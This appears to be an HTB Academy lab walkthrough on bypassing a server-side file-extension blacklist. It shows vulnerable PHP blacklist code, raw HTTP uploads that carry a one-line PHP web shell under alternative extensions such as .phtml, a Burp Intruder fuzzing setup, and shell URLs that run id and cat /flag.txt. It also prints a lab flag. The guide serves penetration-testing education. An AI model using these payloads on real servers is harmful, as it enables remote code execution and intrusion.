# Blacklist Filters

> **🚫 Extension Blocking:** Bypassing server-side blacklist validation that blocks specific file extensions

## Overview

In the previous section, we saw an example of a web application that only applied type validation controls on the front-end (i.e., client-side), which made it trivial to bypass these controls. This is why it is always recommended to implement all security-related controls on the back-end server, where attackers cannot directly manipulate it.

Still, if the type validation controls on the back-end server were not securely coded, an attacker can utilize multiple techniques to bypass them and reach PHP file uploads.

The exercise we find in this section is similar to the one we saw in the previous section, but it has a blacklist of disallowed extensions to prevent uploading web scripts.

---

## Blacklisting Extensions

> **⚠️ Incomplete Protection:** Blacklists cannot cover all possible dangerous extensions

### Understanding Blacklist Validation

There are generally two common forms of validating a file extension on the back-end:

1. **Testing against a blacklist of types** (deny specific extensions)
2. **Testing against a whitelist of types** (allow only specific extensions)

Furthermore, the validation may also check the file type or the file content for type matching. The weakest form of validation amongst these is testing the file extension against a blacklist of extension to determine whether the upload request should be blocked.

### Example Blacklist Implementation

**PHP Blacklist Code:**
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

**Vulnerability Analysis:**
- **Incomplete List** - Many dangerous extensions not included
- **Case Sensitivity** - Only checks lowercase extensions
- **Limited Scope** - Doesn't cover all executable extensions

### Testing Blacklist Bypass

**Initial Bypass Attempt:**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/png

<?php system(\$_REQUEST['cmd']); ?>
----boundary--
```

**Expected Response:**
```
Extension not allowed
```

This indicates that the web application has some form of file type validation on the back-end, in addition to the front-end validations.

---

## HTB Academy Lab Solutions

### Lab 1: Basic Blacklist Bypass

**Target:** \`HTB{1_c4n_n3v3r_b3_bl4ckl1573d}\`

**Step-by-Step Solution:**

**Step 1: Reconnaissance**
```bash
# Test basic PHP upload
filename="shell.php" → "Extension not allowed"

# Confirms blacklist filtering is in place
```

**Step 2: Extension Fuzzing**
```bash
# Use Burp Intruder with PHP extensions wordlist
# Look for responses different from "Extension not allowed"
# Identify allowed extensions: .phtml, .php3, .php4, .php5, .inc
```

**Step 3: Test Allowed Extension**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.phtml"
Content-Type: image/png

<?php system(\$_REQUEST['cmd']); ?>
----boundary--
```

**Step 4: Execute Commands**
```bash
# Access uploaded file
http://SERVER_IP:PORT/profile_images/shell.phtml?cmd=id

# Read flag
http://SERVER_IP:PORT/profile_images/shell.phtml?cmd=cat /flag.txt
```

## Fuzzing Extensions

> **🔍 Discovery Process:** Systematically test extensions to find allowed ones

### Extension Wordlists

**Popular Extension Lists:**
- **PayloadsAllTheThings** - PHP and .NET web application extensions
- **SecLists** - Common web extensions list
- **Custom Lists** - Application-specific extensions

**PHP Extensions to Test:**
```bash
# Common PHP extensions
php, phtml, php3, php4, php5, php7, phps, phar, inc

# Alternative PHP extensions
php2, php6, php8, phpt, pht, phtm, phps, phps3, phps4, phps5
```

### Burp Suite Fuzzing Setup

**Step 1: Intercept Upload Request**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="uploadFile"; filename="HTB.§php§"
Content-Type: image/png

<?php system(\$_REQUEST['cmd']); ?>
----boundary--
```

**Step 2: Configure Intruder**
1. **Send to Intruder** - Right-click request → "Send to Intruder"
2. **Clear Positions** - Remove auto-generated payload positions
3. **Add Position** - Select \`.php\` extension and click "Add §"
4. **Load Payloads** - Upload PHP extensions wordlist
5. **Disable URL Encoding** - Uncheck URL encoding option

**Step 3: Analyze Results**
```bash
# Sort results by Length/Response
# Look for different response patterns:
# - "Extension not allowed" = BLOCKED
# - "File successfully uploaded" = ALLOWED
# - Different Content-Length = Potential bypass
```

### Testing .phtml Extension

**Step 1: Modify Request**
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=--boundary

----boundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.phtml"
Content-Type: image/png

<?php system(\$_REQUEST['cmd']); ?>
----boundary--
```

**Step 2: Test Code Execution**
```bash
# Navigate to uploaded file
http://SERVER_IP:PORT/profile_images/shell.phtml?cmd=id

# Expected output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This comprehensive guide demonstrates the weaknesses of blacklist-based filtering and provides practical techniques for bypassing such controls during penetration testing.
